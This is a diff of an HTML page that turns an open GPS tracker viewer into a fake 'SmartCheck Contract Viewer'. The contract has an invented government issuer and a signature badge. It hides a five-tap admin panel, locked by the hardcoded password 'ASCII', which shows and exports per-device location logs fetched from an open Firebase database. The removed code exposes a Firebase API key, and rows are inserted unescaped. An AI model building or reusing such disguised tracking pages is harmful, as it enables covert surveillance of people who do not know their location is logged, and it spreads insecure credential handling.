@@ -1,71 +1,93 @@
 <!DOCTYPE html><html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>SmartTrust GPS Tracker</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SmartTrust Viewer</title>
   <style>
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #f4f6f9;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f2f2f2;
       color: #333;
     }
     header {
-      background: #2e86de;
+      background: linear-gradient(to right, #0b0c2a, #1f2d50);
       color: white;
-      padding: 1rem;
+      padding: 20px;
       text-align: center;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+    }
+    .content {
+      padding: 30px;
+      max-width: 900px;
+      margin: auto;
+      background: white;
+      box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
+      margin-top: 40px;
       position: relative;
     }
-    h1 {
-      margin: 0;
+    .contract-title {
+      font-size: 24px;
+      color: #1f2d50;
+      margin-bottom: 10px;
     }
-    .tap-area {
+    .contract-meta {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #666;
+    }
+    .section {
+      margin-bottom: 25px;
+    }
+    .section-title {
+      font-weight: bold;
+      margin-bottom: 5px;
+      color: #333;
+    }
+    .coords {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 2;
+      bottom: 10px;
+      right: 20px;
+      font-size: 12px;
+      color: #888;
     }
-    .map-container {
-      height: 400px;
-      width: 100%;
-    }
-    .info {
-      padding: 1rem;
-    }
-    .footer {
+    footer {
       text-align: center;
-      padding: 1rem;
-      font-size: 0.9rem;
-      color: #aaa;
+      font-size: 12px;
+      color: #888;
+      padding: 30px 10px;
+    }
+    #adminBtnArea {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      height: 60px;
     }
     .admin-panel {
       display: none;
-      background: #222;
-      color: white;
       position: fixed;
       top: 0;
       left: 0;
       width: 100%;
       height: 100%;
-      padding: 20px;
+      background: rgba(0, 0, 0, 0.95);
+      color: white;
+      padding: 30px;
       overflow-y: auto;
       z-index: 9999;
     }
-    .admin-panel table {
-      width: 100%;
-      margin-top: 20px;
-      border-collapse: collapse;
-      font-size: 14px;
-    }
-    .admin-panel table, th, td {
-      border: 1px solid #888;
-      padding: 8px;
-    }
     .admin-panel h2 {
       color: #00ffcc;
+    }
+    .admin-panel table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 20px;
+      font-size: 14px;
+    }
+    .admin-panel table, .admin-panel th, .admin-panel td {
+      border: 1px solid #999;
+      padding: 8px;
     }
     .btn {
       background: #00ffcc;
@@ -75,96 +97,122 @@
       margin: 10px 5px;
       cursor: pointer;
     }
+    .hidden-input {
+      background: black;
+      border: 1px solid #00ffcc;
+      color: #00ffcc;
+      padding: 10px;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 20px;
+    }
   </style>
 </head>
-<body>
-  <header>
-    <h1>SmartTrust GPS Viewer</h1>
-    <div class="tap-area" id="tapArea"></div>
-  </header>
-  <div class="map-container" id="map"></div>
-  <div class="info">
-    <h3>Device Last Seen:</h3>
-    <p id="lastSeen">Loading...</p>
-    <h3>Coordinates:</h3>
-    <p id="coords">--</p>
-    <h3>Speed:</h3>
-    <p id="speed">--</p>
-    <h3>Direction:</h3>
-    <p id="direction">--</p>
-  </div>  <div class="admin-panel" id="adminPanel">
-    <h2>Admin Panel</h2>
-    <p><strong>Realtime Location Logs:</strong></p>
-    <table>
+<body><header>
+  <h1>SmartTrust Viewer</h1>
+  <p>Last seen: 8/1/2025, 11:43:41 PM</p>
+</header><div class="content">
+  <div class="contract-title">SmartCheck Contract Viewer</div>
+  <div class="contract-meta">
+    Document: SC-024/NGX-CON<br>
+    Status: Active<br>
+    Issued by: National Blockchain Governance Unit<br>
+    Effective Date: August 1, 2025<br>
+    Parties: GlobalChain Inc. and SmartCheck Solutions<br>
+    [Digital Signature Verified ✅]
+  </div>  <div class="section">
+    <div class="section-title">Section 1: Terms & Conditions</div>
+    This Agreement outlines the rights and responsibilities of both parties.
+  </div>
+  <div class="section">
+    <div class="section-title">Section 2: Payment Schedule</div>
+    Payments will be made quarterly and subject to review.
+  </div>
+  <div class="section">
+    <div class="section-title">Section 3: Liability Clause</div>
+    Both parties agree to indemnify each other against third-party claims.
+  </div>
+  <div class="section">
+    <div class="section-title">Section 4: Signature Authorization</div>
+    This agreement becomes valid upon digital signature confirmation.
+  </div>  <div class="coords">
+    Lat: <span id="lat">Loading...</span>, Lng: <span id="lng">Loading...</span>
+  </div>
+</div><div id="adminBtnArea" onclick="handleTap()"></div><div class="admin-panel" id="adminPanel">
+  <h2>Admin Panel – Location Logs</h2>
+  <input type="password" placeholder="Enter Password" class="hidden-input" id="adminPass">
+  <button class="btn" onclick="checkPassword()">Enter</button>
+  <div id="logArea" style="display: none;">
+    <button class="btn" onclick="clearLogs()">🗑 Clear Logs</button>
+    <button class="btn" onclick="exportLogs()">📁 Export CSV</button>
+    <table id="logTable">
       <thead>
-        <tr><th>Time</th><th>Latitude</th><th>Longitude</th><th>Speed</th><th>Direction</th></tr>
+        <tr><th>Time</th><th>Lat</th><th>Lng</th><th>Speed</th><th>Direction</th><th>Device</th></tr>
       </thead>
-      <tbody id="logTable"></tbody>
+      <tbody></tbody>
     </table>
-    <button class="btn" onclick="closeAdmin()">Close Panel</button>
-  </div>  <div class="footer">© 2025 SmartTrust. All rights reserved.</div>  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>  <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY"></script>  <script>
-    const firebaseConfig = {
-      apiKey: "AIzaSyCvYA-6_hjcy47NHFCRoVK2JcrmcVKMVKw",
-      authDomain: "gps-d0bab.firebaseapp.com",
-      databaseURL: "https://gps-d0bab-default-rtdb.firebaseio.com",
-      projectId: "gps-d0bab",
-      storageBucket: "gps-d0bab.appspot.com",
-      messagingSenderId: "810816177909",
-      appId: "1:810816177909:web:aad210ebbb87f8d64ce7bc"
-    };
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
+  </div>
+</div><footer>
+  <p>SmartTrust Technologies Ltd.<br>© 2025 SmartTrust. All rights reserved.</p>
+</footer><script>
+let tapCount = 0;
+let tapTimeout;
 
-    let map;
-    let marker;
-    function initMap(lat, lng) {
-      map = new google.maps.Map(document.getElementById("map"), {
-        zoom: 15,
-        center: { lat, lng }
+function handleTap() {
+  tapCount++;
+  clearTimeout(tapTimeout);
+  tapTimeout = setTimeout(() => tapCount = 0, 1500);
+  if (tapCount >= 5) {
+    document.getElementById('adminPanel').style.display = 'block';
+  }
+}
+
+function checkPassword() {
+  const pass = document.getElementById('adminPass').value;
+  if (pass === 'ASCII') {
+    document.getElementById('logArea').style.display = 'block';
+  } else {
+    alert('Wrong password');
+  }
+}
+
+function clearLogs() {
+  document.querySelector('#logTable tbody').innerHTML = '';
+}
+
+function exportLogs() {
+  let csv = 'Time,Lat,Lng,Speed,Direction,Device\n';
+  document.querySelectorAll('#logTable tbody tr').forEach(row => {
+    csv += Array.from(row.cells).map(cell => cell.textContent).join(',') + '\n';
+  });
+  const blob = new Blob([csv], { type: 'text/csv' });
+  const link = document.createElement('a');
+  link.href = URL.createObjectURL(blob);
+  link.download = 'location_logs.csv';
+  link.click();
+}
+
+function updateCoords() {
+  fetch('https://gps-d0bab-default-rtdb.firebaseio.com/logs.json')
+    .then(res => res.json())
+    .then(data => {
+      const keys = Object.keys(data || {}).reverse();
+      const latest = data[keys[0]];
+      document.getElementById('lat').textContent = latest.lat;
+      document.getElementById('lng').textContent = latest.lng;
+
+      const tbody = document.querySelector('#logTable tbody');
+      tbody.innerHTML = '';
+      keys.forEach(k => {
+        const row = data[k];
+        const tr = document.createElement('tr');
+        tr.innerHTML = `<td>${row.time}</td><td>${row.lat}</td><td>${row.lng}</td><td>${row.speed}</td><td>${row.direction}</td><td>${row.device}</td>`;
+        tbody.appendChild(tr);
       });
-      marker = new google.maps.Marker({ position: { lat, lng }, map });
-    }
-
-    db.ref("locations").on("value", snapshot => {
-      const data = snapshot.val();
-      const logs = Object.entries(data || {}).sort((a, b) => b[1].timestamp - a[1].timestamp);
-      const latest = logs[0]?.[1];
-      if (latest) {
-        const { latitude, longitude, timestamp, speed = '--', direction = '--' } = latest;
-        document.getElementById("lastSeen").textContent = new Date(timestamp).toLocaleString();
-        document.getElementById("coords").textContent = `Lat: ${latitude}, Lng: ${longitude}`;
-        document.getElementById("speed").textContent = `${speed} km/h`;
-        document.getElementById("direction").textContent = direction;
-
-        if (!map) initMap(latitude, longitude);
-        else marker.setPosition({ lat: latitude, lng: longitude });
-        map.setCenter({ lat: latitude, lng: longitude });
-
-        let logsHtml = logs.map(([key, val]) =>
-          `<tr><td>${new Date(val.timestamp).toLocaleString()}</td><td>${val.latitude}</td><td>${val.longitude}</td><td>${val.speed || '--'}</td><td>${val.direction || '--'}</td></tr>`
-        ).join("");
-        document.getElementById("logTable").innerHTML = logsHtml;
-      }
     });
+}
 
-    let tapCount = 0;
-    let lastTap = 0;
-    document.getElementById("tapArea").addEventListener("click", () => {
-      const now = Date.now();
-      if (now - lastTap < 600) {
-        tapCount++;
-        if (tapCount >= 5) {
-          document.getElementById("adminPanel").style.display = "block";
-          tapCount = 0;
-        }
-      } else {
-        tapCount = 1;
-      }
-      lastTap = now;
-    });
-
-    function closeAdmin() {
-      document.getElementById("adminPanel").style.display = "none";
-    }
-  </script></body>
-</html>
+updateCoords();
+setInterval(updateCoords, 60000);
+</script></body>
+        </html>
